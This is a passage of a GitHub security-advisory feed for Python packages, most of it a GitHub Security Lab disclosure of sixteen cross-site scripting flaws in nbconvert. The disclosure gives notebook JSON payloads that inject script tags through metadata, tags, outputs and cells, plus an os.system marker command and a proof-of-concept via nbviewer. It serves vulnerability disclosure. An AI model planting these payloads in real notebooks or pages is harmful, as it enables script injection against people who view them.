<li><a href="https://security.snyk.io/vuln/SNYK-PYTHON-ASYNCUA-2988731">https://security.snyk.io/vuln/SNYK-PYTHON-ASYNCUA-2988731</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-PYTHON-OPCUA-2988730">https://security.snyk.io/vuln/SNYK-PYTHON-OPCUA-2988730</a></li>
<li><a href="https://github.com/advisories/GHSA-mfpj-3qhm-976m">https://github.com/advisories/GHSA-mfpj-3qhm-976m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mfpj-3qhm-976m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-08-24T00:00:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[asyncua] Uncontrolled Resource Consumption in asyncua and opcua]]></title>
        <id>https://github.com/advisories/GHSA-mfpj-3qhm-976m</id>
        <link href="https://github.com/advisories/GHSA-mfpj-3qhm-976m"/>
        <updated>2022-08-30T20:50:33.000Z</updated>
        <content type="html"><![CDATA[<p>All versions of package opcua; all versions of package asyncua are vulnerable to Denial of Service (DoS) due to a missing limitation on the number of received chunks - per single session or in total for all concurrent sessions. An attacker can exploit this vulnerability by sending an unlimited number of huge chunks (e.g. 2GB each) without sending the Final closing chunk.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-25304">https://nvd.nist.gov/vuln/detail/CVE-2022-25304</a></li>
<li><a href="https://github.com/FreeOpcUa/python-opcua/issues/1466">https://github.com/FreeOpcUa/python-opcua/issues/1466</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-PYTHON-ASYNCUA-2988731">https://security.snyk.io/vuln/SNYK-PYTHON-ASYNCUA-2988731</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-PYTHON-OPCUA-2988730">https://security.snyk.io/vuln/SNYK-PYTHON-OPCUA-2988730</a></li>
<li><a href="https://github.com/advisories/GHSA-mfpj-3qhm-976m">https://github.com/advisories/GHSA-mfpj-3qhm-976m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mfpj-3qhm-976m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-08-24T00:00:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[OctoPrint] Unverified Password Change in OctoPrint]]></title>
        <id>https://github.com/advisories/GHSA-39gf-864w-pxw4</id>
        <link href="https://github.com/advisories/GHSA-39gf-864w-pxw4"/>
        <updated>2022-08-30T20:25:15.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of OctoPrint prior to 1.8.3 did not require the current user password in order to change that users password. As a result users could be locked out of their accounts or have their accounts stolen under certain circumstances.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-2930">https://nvd.nist.gov/vuln/detail/CVE-2022-2930</a></li>
<li><a href="https://github.com/octoprint/octoprint/commit/1453076ee3e47fcab2dc73664ec2d61d3ef7fc4f">https://github.com/octoprint/octoprint/commit/1453076ee3e47fcab2dc73664ec2d61d3ef7fc4f</a></li>
<li><a href="https://huntr.dev/bounties/da6745e4-7bcc-4e9a-9e96-0709ec9f2477">https://huntr.dev/bounties/da6745e4-7bcc-4e9a-9e96-0709ec9f2477</a></li>
<li><a href="https://github.com/advisories/GHSA-39gf-864w-pxw4">https://github.com/advisories/GHSA-39gf-864w-pxw4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-39gf-864w-pxw4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-08-23T00:00:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[eth-account] Regular expression denial of service in eth-account]]></title>
        <id>https://github.com/advisories/GHSA-v65g-f3cj-fjp4</id>
        <link href="https://github.com/advisories/GHSA-v65g-f3cj-fjp4"/>
        <updated>2022-08-30T20:20:59.000Z</updated>
        <content type="html"><![CDATA[<p>An exponential ReDoS (Regular Expression Denial of Service) can be triggered in the eth-account PyPI package, when an attacker is able to supply arbitrary input to the encode_structured_data method</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-1930">https://nvd.nist.gov/vuln/detail/CVE-2022-1930</a></li>
<li><a href="https://research.jfrog.com/vulnerabilities/eth-account-redos-xray-248681/">https://research.jfrog.com/vulnerabilities/eth-account-redos-xray-248681/</a></li>
<li><a href="https://github.com/ethereum/eth-account/commit/70f89be700df0d5f08ef696252c88741f8414060">https://github.com/ethereum/eth-account/commit/70f89be700df0d5f08ef696252c88741f8414060</a></li>
<li><a href="https://github.com/advisories/GHSA-v65g-f3cj-fjp4">https://github.com/advisories/GHSA-v65g-f3cj-fjp4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v65g-f3cj-fjp4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-08-23T00:00:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mistune] Mistune v2.0.2 vulnerable to catastrophic backtracking]]></title>
        <id>https://github.com/advisories/GHSA-fw3v-x4f2-v673</id>
        <link href="https://github.com/advisories/GHSA-fw3v-x4f2-v673"/>
        <updated>2022-08-24T19:20:06.000Z</updated>
        <content type="html"><![CDATA[<p>In Mistune through 2.0.2, support of inline markup is implemented by using regular expressions that can involve a high amount of backtracking on certain edge cases. This behavior is commonly named catastrophic backtracking.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-34749">https://nvd.nist.gov/vuln/detail/CVE-2022-34749</a></li>
<li><a href="https://github.com/lepture/mistune/commit/a6d43215132fe4f3d93f8d7e90ba83b16a0838b2">https://github.com/lepture/mistune/commit/a6d43215132fe4f3d93f8d7e90ba83b16a0838b2</a></li>
<li><a href="https://github.com/lepture/mistune/releases">https://github.com/lepture/mistune/releases</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/mistune/PYSEC-2022-237.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/mistune/PYSEC-2022-237.yaml</a></li>
<li><a href="https://github.com/lepture/mistune/issues/314#issuecomment-1223972386">https://github.com/lepture/mistune/issues/314#issuecomment-1223972386</a></li>
<li><a href="https://github.com/lepture/mistune/commit/ca1e7b506850f4e488823fc7338b49a8f9852718">https://github.com/lepture/mistune/commit/ca1e7b506850f4e488823fc7338b49a8f9852718</a></li>
<li><a href="https://github.com/pypa/advisory-database/blob/main/vulns/mistune/PYSEC-2022-237.yaml">https://github.com/pypa/advisory-database/blob/main/vulns/mistune/PYSEC-2022-237.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-fw3v-x4f2-v673">https://github.com/advisories/GHSA-fw3v-x4f2-v673</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fw3v-x4f2-v673</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-07-26T00:00:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nbconvert] nbconvert vulnerable to cross-site scripting (XSS) via multiple exploit paths]]></title>
        <id>https://github.com/advisories/GHSA-9jmq-rx5f-8jwq</id>
        <link href="https://github.com/advisories/GHSA-9jmq-rx5f-8jwq"/>
        <updated>2022-08-23T16:59:20.000Z</updated>
        <content type="html"><![CDATA[<p>Cross-linking to <a href="https://github.com/jupyter/nbviewer/security/advisories/GHSA-h274-fcvj-h2wm">https://github.com/jupyter/nbviewer/security/advisories/GHSA-h274-fcvj-h2wm</a></p>
<p>Most of the fixes will be in this repo, though, so having it here gives us the private fork to work on patches</p>
<p>Below is currently a duplicate of the original report:</p>
<hr>
<p>Received on <a href="mailto:security@ipython.org">security@ipython.org</a> unedited, I'm not sure if we want to make it separate advisories. </p>
<p>Pasted raw for now, feel free to edit or make separate advisories if you have the rights to. </p>
<h2 id="i-think-the-most-important-is-to-switch-back-from-nbviewerjupyterorg---nbviewerorg-at-the-cloudflare-level-i-guess--there-might-be-fastly-involved-as-well">I think the most important is to switch back from nbviewer.jupyter.org -&gt; nbviewer.org at the cloudflare level I guess ? There might be fastly involved as well.</h2>
<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<h3 id="patches">Patches</h3>
<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>
<h3 id="references">References</h3>
<p><em>Are there any links users can visit to find out more?</em></p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in <a href="http://example.com">example link to repo</a></li>
<li>Email us at <a href="mailto:example@example.com">example email address</a></li>
</ul>
<hr>
<h1 id="github-security-lab-ghsl-vulnerability-report">GitHub Security Lab (GHSL) Vulnerability Report</h1>
<p>The <a href="https://securitylab.github.com">GitHub Security Lab</a> team has identified potential security vulnerabilities in <a href="https://github.com/jupyter/nbconvert">nbconvert</a>.</p>
<p>We are committed to working with you to help resolve these issues. In this report you will find everything you need to effectively coordinate a resolution of these issues with the GHSL team.</p>
<p>If at any point you have concerns or questions about this process, please do not hesitate to reach out to us at <code>securitylab@github.com</code> (please include <code>GHSL-2021-1013</code>, <code>GHSL-2021-1014</code>, <code>GHSL-2021-1015</code>, <code>GHSL-2021-1016</code>, <code>GHSL-2021-1017</code>, <code>GHSL-2021-1018</code>, <code>GHSL-2021-1019</code>, <code>GHSL-2021-1020</code>, <code>GHSL-2021-1021</code>, <code>GHSL-2021-1022</code>, <code>GHSL-2021-1023</code>, <code>GHSL-2021-1024</code>, <code>GHSL-2021-1025</code>, <code>GHSL-2021-1026</code>, <code>GHSL-2021-1027</code> or <code>GHSL-2021-1028</code> as a reference).</p>
<p>If you are <em>NOT</em> the correct point of contact for this report, please let us know!</p>
<h2 id="summary">Summary</h2>
<p>When using nbconvert to generate an HTML version of a user-controllable notebook, it is possible to inject arbitrary HTML which may lead to Cross-Site Scripting (XSS) vulnerabilities if these HTML notebooks are served by a web server (eg: nbviewer) </p>
<h2 id="product">Product</h2>
<p>nbconvert</p>
<h2 id="tested-version">Tested Version</h2>
<p><a href="https://github.com/jupyter/nbconvert/releases/tag/5.5.0">v5.5.0</a></p>
<h2 id="details">Details</h2>
<h3 id="issue-1-xss-in-notebookmetadatalanguage_infopygments_lexer-ghsl-2021-1013">Issue 1: XSS in notebook.metadata.language_info.pygments_lexer (<code>GHSL-2021-1013</code>)</h3>
<p>Attacker in control of a notebook can inject arbitrary unescaped HTML in the <code>notebook.metadata.language_info.pygments_lexer</code> field such as the following:</p>
<pre><code class="language-json">"metadata": {
  "language_info": {
   "pygments_lexer": "ipython3-foo\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;"
  }
}
</code></pre>
<p>This node is read in the <a href="https://github.com/jupyter/nbconvert/blob/3c0f82d1acbcf2264ae0fa892141a037563aabd0/nbconvert/exporters/html.py#L135-L140"><code>from_notebook_node</code></a> method:</p>
<pre><code class="language-python">def from_notebook_node(self, nb, resources=None, **kw):
  langinfo = nb.metadata.get('language_info', {})
  lexer = langinfo.get('pygments_lexer', langinfo.get('name', None))
  highlight_code = self.filters.get('highlight_code', Highlight2HTML(pygments_lexer=lexer, parent=self))
  self.register_filter('highlight_code', highlight_code)
  return super().from_notebook_node(nb, resources, **kw)
</code></pre>
<p>It is then assigned to <code>language</code> var and passed down to <a href="https://github.com/jupyter/nbconvert/blob/3c0f82d1acbcf2264ae0fa892141a037563aabd0/nbconvert/filters/highlight.py#L90"><code>_pygments_highlight</code></a></p>
<pre><code class="language-python">from pygments.formatters import LatexFormatter
if not language:
  language=self.pygments_lexer
latex = _pygments_highlight(source, LatexFormatter(), language, metadata)
</code></pre>
<p>In this method, the <code>language</code> variable is <a href="https://github.com/jupyter/nbconvert/blob/3c0f82d1acbcf2264ae0fa892141a037563aabd0/nbconvert/filters/highlight.py#L56">concatenated to <code>highlight hl-</code> string to conform the <code>cssclass</code></a> passed to the <code>HTMLFormatter</code> constructor:</p>
<pre><code class="language-python">return _pygments_highlight(source if len(source) &gt; 0 else ' ',
  # needed to help post processors:
  HtmlFormatter(cssclass=" highlight hl-"+language),
  language, metadata)
</code></pre>
<p>The <code>cssclass</code> variable is then <a href="https://github.com/pygments/pygments/blob/30cfa26201a27dee1f8e6b0d600cad1138e64507/pygments/formatters/html.py#L791">concatenated in the outer div class attribute</a></p>
<pre><code class="language-python">yield 0, ('&lt;div' + (self.cssclass and ' class="%s"' % self.cssclass) + (style and (' style="%s"' % style)) + '&gt;')
</code></pre>
<p>Note that the <code>cssclass</code> variable is also used in other unsafe places such as <a href="https://github.com/pygments/pygments/blob/30cfa26201a27dee1f8e6b0d600cad1138e64507/pygments/formatters/html.py#L711"><code>'&lt;table class="%stable"&gt;' % self.cssclass + filename_tr +</code></a>)</p>
<h3 id="issue-2-xss-in-notebookmetadatatitle-ghsl-2021-1014">Issue 2: XSS in notebook.metadata.title (<code>GHSL-2021-1014</code>)</h3>
<p>The <code>notebook.metadata.title</code> node is rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/3c0f82d1acbcf2264ae0fa892141a037563aabd0/share/jupyter/nbconvert/templates/lab/index.html.j2#L12-L13"><code>index.html.j2</code></a> HTML template with no escaping: </p>
<pre><code class="language-html">{% set nb_title = nb.metadata.get('title', '') or resources['metadata']['name'] %}
&lt;title&gt;{{nb_title}}&lt;/title&gt;
</code></pre>
<p>The following <code>notebook.metadata.title</code> node will execute arbitrary javascript:</p>
<pre><code class="language-json"> "metadata": {
  "title": "TITLE&lt;/title&gt;&lt;script&gt;alert(1)&lt;/script&gt;"
 }
</code></pre>
<p>Note: this issue also affect other templates, not just the <code>lab</code> one.</p>
<h3 id="issue-3-xss-in-notebookmetadatawidgetsghsl-2021-1015">Issue 3: XSS in notebook.metadata.widgets(<code>GHSL-2021-1015</code>)</h3>
<p>The <code>notebook.metadata.widgets</code> node is rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/3c0f82d1acbcf2264ae0fa892141a037563aabd0/share/jupyter/nbconvert/templates/lab/index.html.j2#L12-L13"><code>base.html.j2</code></a> HTML template with no escaping: </p>
<pre><code class="language-html">{% set mimetype = 'application/vnd.jupyter.widget-state+json'%}
{% if mimetype in nb.metadata.get("widgets",{})%}
&lt;script type="{{ mimetype }}"&gt;
{{ nb.metadata.widgets[mimetype] | json_dumps }}
&lt;/script&gt;
{% endif %}
</code></pre>
<p>The following <code>notebook.metadata.widgets</code> node will execute arbitrary javascript:</p>
<pre><code class="language-json"> "metadata": {
  "widgets": {
    "application/vnd.jupyter.widget-state+json": {"foo": "pwntester&lt;/script&gt;&lt;script&gt;alert(1);//"}
  }
 }
</code></pre>
<p>Note: this issue also affect other templates, not just the <code>lab</code> one.</p>
<h3 id="issue-4-xss-in-notebookcellmetadatatagsghsl-2021-1016">Issue 4: XSS in notebook.cell.metadata.tags(<code>GHSL-2021-1016</code>)</h3>
<p>The <code>notebook.cell.metadata.tags</code> nodes are output directly to the <a href="https://github.com/jupyter/nbconvert/blob/3c0f82d1acbcf2264ae0fa892141a037563aabd0/share/jupyter/nbconvert/templates/base/celltags.j2#L4"><code>celltags.j2</code></a> HTML template with no escaping: </p>
<pre><code>{%- macro celltags(cell) -%}
    {% if cell.metadata.tags | length &gt; 0 -%}
        {% for tag in cell.metadata.tags -%}
            {{ ' celltag_' ~ tag -}}
        {%- endfor -%}
    {%- endif %}
{%- endmacro %}
</code></pre>
<p>The following <code>notebook.cell.metadata.tags</code> node will execute arbitrary javascript:</p>
<pre><code class="language-json">  {
   "cell_type": "code",
   "execution_count": null,
   "id": "727d1a5f",
   "metadata": {
     "tags": ["FOO\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;div \""]
   },
   "outputs": [],
   "source": []
  }
 ],
</code></pre>
<p>Note: this issue also affect other templates, not just the <code>lab</code> one.</p>
<h3 id="issue-5-xss-in-output-data-texthtml-cellsghsl-2021-1017">Issue 5: XSS in output data text/html cells(<code>GHSL-2021-1017</code>)</h3>
<p>Using the <code>text/html</code> output data mime type allows arbitrary javascript to be executed when rendering an HTML notebook. This is probably by design, however, it would be nice to enable an option which uses an HTML sanitizer preprocessor to strip down all javascript elements:</p>
<p>The following is an example of a cell with <code>text/html</code> output executing arbitrary javascript code:</p>
<pre><code class="language-json">  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "b72e53fa",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
        "&lt;script&gt;alert(1)&lt;/script&gt;"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import os; os.system('touch /tmp/pwned')"
   ]
  },
</code></pre>
<h3 id="issue-6-xss-in-output-data-imagesvgxml-cellsghsl-2021-1018">Issue 6: XSS in output data image/svg+xml cells(<code>GHSL-2021-1018</code>)</h3>
<p>Using the <code>image/svg+xml</code> output data mime type allows arbitrary javascript to be executed when rendering an HTML notebook. </p>
<p>The <code>cell.output.data["image/svg+xml"]</code> nodes are rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2"><code>base.html.j2</code></a> HTML template with no escaping</p>
<pre><code>{%- else %}
{{ output.data['image/svg+xml'] }}
{%- endif %}
</code></pre>
<p>The following <code>cell.output.data["image/svg+xml"]</code> node will execute arbitrary javascript:</p>
<pre><code class="language-json">    {
     "output_type": "execute_result",
     "data": {
      "image/svg+xml": ["&lt;script&gt;console.log(\"image/svg+xml output\")&lt;/script&gt;"]
     },
     "execution_count": null,
     "metadata": {
     }
    }
</code></pre>
<h3 id="issue-7-xss-in-notebookcelloutputsvg_filenameghsl-2021-1019">Issue 7: XSS in notebook.cell.output.svg_filename(<code>GHSL-2021-1019</code>)</h3>
<p>The <code>cell.output.svg_filename</code> nodes are rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2"><code>base.html.j2</code></a> HTML template with no escaping</p>
<pre><code>{%- if output.svg_filename %}
&lt;img src="{{ output.svg_filename | posix_path }}"&gt;
</code></pre>
<p>The following <code>cell.output.svg_filename</code> node will escape the <code>img</code> tag context and execute arbitrary javascript:</p>
<pre><code class="language-json">  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b72e53fa",
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "svg_filename": "\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;",
     "data": {
      "image/svg+xml": [""]
     },
     "execution_count": null,
     "metadata": {
     }
    }
   ],
   "source": [""]
  },
</code></pre>
<h3 id="issue-8-xss-in-output-data-textmarkdown-cellsghsl-2021-1020">Issue 8: XSS in output data text/markdown cells(<code>GHSL-2021-1020</code>)</h3>
<p>Using the <code>text/markdown</code> output data mime type allows arbitrary javascript to be executed when rendering an HTML notebook. </p>
<p>The <code>cell.output.data["text/markdown"]</code> nodes are rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2"><code>base.html.j2</code></a> HTML template with no escaping</p>
<pre><code>{{ output.data['text/markdown'] | markdown2html }}
</code></pre>
<p>The following <code>cell.output.data["text/markdown"]</code> node will execute arbitrary javascript:</p>
<pre><code>    {
     "output_type": "execute_result",
     "data": {
      "text/markdown": ["&lt;script&gt;console.log(\"text/markdown output\")&lt;/script&gt;"]
     },
     "execution_count": null,
     "metadata": {}
    }
</code></pre>
<h3 id="issue-9-xss-in-output-data-applicationjavascript-cellsghsl-2021-1021">Issue 9: XSS in output data application/javascript cells(<code>GHSL-2021-1021</code>)</h3>
<p>Using the <code>application/javascript</code> output data mime type allows arbitrary javascript to be executed when rendering an HTML notebook. This is probably by design, however, it would be nice to enable an option which uses an HTML sanitizer preprocessor to strip down all javascript elements:</p>
<p>The <code>cell.output.data["application/javascript"]</code> nodes are rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2"><code>base.html.j2</code></a> HTML template with no escaping</p>
<pre><code>&lt;script type="text/javascript"&gt;
var element = document.getElementById('{{ div_id }}');
{{ output.data['application/javascript'] }}
&lt;/script&gt;
</code></pre>
<p>The following <code>cell.output.data["application/javascript"]</code> node will execute arbitrary javascript:</p>
<pre><code>    {
     "output_type": "execute_result",
     "data": {
      "application/javascript": ["console.log(\"application/javascript output\")"]
     },
     "execution_count": null,
     "metadata": {}
    }
</code></pre>
<h3 id="issue-10-xss-is-outputmetadatafilenames-imagepng-and-imagejpegghsl-2021-1022">Issue 10: XSS is output.metadata.filenames image/png and image/jpeg(<code>GHSL-2021-1022</code>)</h3>
<p>The <code>cell.output.metadata.filenames["images/png"]</code> and <code>cell.metadata.filenames["images/jpeg"]</code> nodes are rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2"><code>base.html.j2</code></a> HTML template with no escaping:</p>
<pre><code>{%- if 'image/png' in output.metadata.get('filenames', {}) %}
&lt;img src="{{ output.metadata.filenames['image/png'] | posix_path }}"
</code></pre>
<p>The following <code>filenames</code> node will execute arbitrary javascript:</p>
<pre><code class="language-json">    {
     "output_type": "execute_result",
     "data": {
      "image/png": [""]
     },
     "execution_count": null,
     "metadata": {
       "filenames": {
          "image/png": "\"&gt;&lt;script&gt;console.log(\"output.metadata.filenames.image/png injection\")&lt;/script&gt;" 
       }
     }
    }
</code></pre>
<h3 id="issue-11-xss-in-output-data-imagepng-and-imagejpeg-cellsghsl-2021-1023">Issue 11: XSS in output data image/png and image/jpeg cells(<code>GHSL-2021-1023</code>)</h3>
<p>Using the <code>image/png</code> or <code>image/jpeg</code> output data mime type allows arbitrary javascript to be executed when rendering an HTML notebook. </p>
<p>The <code>cell.output.data["images/png"]</code> and <code>cell.output.data["images/jpeg"]</code> nodes are rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2"><code>base.html.j2</code></a> HTML template with no escaping:</p>
<pre><code>{%- else %}
&lt;img src="data:image/png;base64,{{ output.data['image/png'] }}"
{%- endif %}
</code></pre>
<p>The following <code>cell.output.data["image/png"]</code> node will execute arbitrary javascript:</p>
<pre><code class="language-json">    {
     "output_type": "execute_result",
     "data": {
      "image/png": ["\"&gt;&lt;script&gt;console.log(\"image/png output\")&lt;/script&gt;"]
     },
     "execution_count": null,
     "metadata": {}
    }
</code></pre>
<h3 id="issue-12-xss-is-outputmetadatawidthheight-imagepng-and-imagejpegghsl-2021-1024">Issue 12: XSS is output.metadata.width/height image/png and image/jpeg(<code>GHSL-2021-1024</code>)</h3>
<p>The <code>cell.output.metadata.width</code> and <code>cell.output.metadata.height</code> nodes of both <code>image/png</code> and <code>image/jpeg</code> cells are rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2"><code>base.html.j2</code></a> HTML template with no escaping:</p>
<pre><code>{%- set width=output | get_metadata('width', 'image/png') -%}
width={{ width }}
{%- set height=output | get_metadata('height', 'image/png') -%}
height={{ height }}
</code></pre>
<p>The following <code>output.metadata.width</code> node will execute arbitrary javascript:</p>
<pre><code class="language-json">    {
     "output_type": "execute_result",
     "data": {
      "image/png": ["abcd"]
     },
     "execution_count": null,
     "metadata": {
        "width": "&gt;&lt;script&gt;console.log(\"output.metadata.width png injection\")&lt;/script&gt;"
     }
    }
</code></pre>
<h3 id="issue-13-xss-in-output-data-applicationvndjupyterwidget-statejson-cellsghsl-2021-1025">Issue 13: XSS in output data application/vnd.jupyter.widget-state+json cells(<code>GHSL-2021-1025</code>)</h3>
<p>The <code>cell.output.data["application/vnd.jupyter.widget-state+json"]</code> nodes are rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2"><code>base.html.j2</code></a> HTML template with no escaping:</p>
<pre><code>{% set datatype_list = output.data | filter_data_type %}
{% set datatype = datatype_list[0]%}
&lt;script type="{{ datatype }}"&gt;
{{ output.data[datatype] | json_dumps }}
&lt;/script&gt;
</code></pre>
<p>The following <code>cell.output.data["application/vnd.jupyter.widget-state+json"]</code> node will execute arbitrary javascript:</p>
<pre><code class="language-json">    {
     "output_type": "execute_result",
     "data": {
      "application/vnd.jupyter.widget-state+json": "\"&lt;/script&gt;&lt;script&gt;console.log('output.data.application/vnd.jupyter.widget-state+json injection')//"
     },
     "execution_count": null,
     "metadata": {}
    }
</code></pre>
<h3 id="issue-14-xss-in-output-data-applicationvndjupyterwidget-viewjson-cellsghsl-2021-1026">Issue 14: XSS in output data application/vnd.jupyter.widget-view+json cells(<code>GHSL-2021-1026</code>)</h3>
<p>The <code>cell.output.data["application/vnd.jupyter.widget-view+json"]</code> nodes are rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2"><code>base.html.j2</code></a> HTML template with no escaping:</p>
<pre><code>{% set datatype_list = output.data | filter_data_type %}
{% set datatype = datatype_list[0]%}
&lt;script type="{{ datatype }}"&gt;
{{ output.data[datatype] | json_dumps }}
&lt;/script&gt;
</code></pre>
<p>The following <code>cell.output.data["application/vnd.jupyter.widget-view+json"]</code> node will execute arbitrary javascript:</p>
<pre><code class="language-json">    {
     "output_type": "execute_result",
     "data": {
      "application/vnd.jupyter.widget-view+json": "\"&lt;/script&gt;&lt;script&gt;console.log('output.data.application/vnd.jupyter.widget-view+json injection')//"
     },
     "execution_count": null,
     "metadata": {}
    }
</code></pre>
<h3 id="issue-15-xss-in-raw-cellsghsl-2021-1027">Issue 15: XSS in raw cells(<code>GHSL-2021-1027</code>)</h3>
<p>Using a <code>raw</code> cell type allows arbitrary javascript to be executed when rendering an HTML notebook. This is probably by design, however, it would be nice to enable an option which uses an HTML sanitizer preprocessor to strip down all javascript elements:</p>
<p>The following is an example of a <code>raw</code> cell executing arbitrary javascript code:</p>
<pre><code class="language-json">  {
   "cell_type": "raw",
   "id": "372c2bf1",
   "metadata": {},
   "source": [
    "Payload in raw cell &lt;script&gt;alert(1)&lt;/script&gt;"
   ]
  }
</code></pre>
<h3 id="issue-16-xss-in-markdown-cellsghsl-2021-1028">Issue 16: XSS in markdown cells(<code>GHSL-2021-1028</code>)</h3>
<p>Using a <code>markdown</code> cell type allows arbitrary javascript to be executed when rendering an HTML notebook. This is probably by design, however, it would be nice to enable an option which uses an HTML sanitizer preprocessor to strip down all javascript elements:</p>
<p>The following is an example of a <code>markdown</code> cell executing arbitrary javascript code:</p>
<pre><code class="language-json">  {
   "cell_type": "markdown",
   "id": "2d42de4a",
   "metadata": {},
   "source": [
     "&lt;script&gt;alert(1)&lt;/script&gt;"
   ]
  },
</code></pre>
<h3 id="proof-of-concept">Proof of Concept</h3>
<p>These vulnerabilities may affect any server using nbconvert to generate HTML and not using a secure content-security-policy (CSP) policy. For example <a href="https://nbviewer.jupyter.org">nbviewer</a> is vulnerable to the above mentioned XSS issues:</p>
<ol>
<li>Create Gist with payload. eg:</li>
</ol>
<ul>
<li><code>https://gist.github.com/pwntester/ff027d91955369b85f99bb1768b7f02c</code></li>
</ul>
<ol start="2">
<li>Then load gist on nbviewer. eg:</li>
</ol>
<ul>
<li><code>https://nbviewer.jupyter.org/gist/pwntester/ff027d91955369b85f99bb1768b7f02c</code></li>
</ul>
<p>Note: response is served with <code>content-security-policy: connect-src 'none';</code></p>
<h2 id="github-security-advisories">GitHub Security Advisories</h2>
<p>We recommend you create a private <a href="https://help.github.com/en/github/managing-security-vulnerabilities/creating-a-security-advisory">GitHub Security Advisory</a> for these findings. This also allows you to invite the GHSL team to collaborate and further discuss these findings in private before they are <a href="https://help.github.com/en/github/managing-security-vulnerabilities/publishing-a-security-advisory">published</a>.</p>
<h2 id="credit">Credit</h2>
<p>These issues were discovered and reported by GHSL team member <a href="https://github.com/pwntester">@pwntester (Alvaro Muñoz)</a>.</p>
<h2 id="contact">Contact</h2>
<p>You can contact the GHSL team at <code>securitylab@github.com</code>, please include a reference to <code>GHSL-2021-1013</code>, <code>GHSL-2021-1014</code>, <code>GHSL-2021-1015</code>, <code>GHSL-2021-1016</code>, <code>GHSL-2021-1017</code>, <code>GHSL-2021-1018</code>, <code>GHSL-2021-1019</code>, <code>GHSL-2021-1020</code>, <code>GHSL-2021-1021</code>, <code>GHSL-2021-1022</code>, <code>GHSL-2021-1023</code>, <code>GHSL-2021-1024</code>, <code>GHSL-2021-1025</code>, <code>GHSL-2021-1026</code>, <code>GHSL-2021-1027</code> or <code>GHSL-2021-1028</code> in any communication regarding these issues.</p>
<h2 id="disclosure-policy">Disclosure Policy</h2>
<p>This report is subject to our <a href="https://securitylab.github.com/advisories#policy">coordinated disclosure policy</a>.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/jupyter/nbconvert/security/advisories/GHSA-9jmq-rx5f-8jwq">https://github.com/jupyter/nbconvert/security/advisories/GHSA-9jmq-rx5f-8jwq</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-32862">https://nvd.nist.gov/vuln/detail/CVE-2021-32862</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/nbconvert/PYSEC-2022-249.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/nbconvert/PYSEC-2022-249.yaml</a></li>
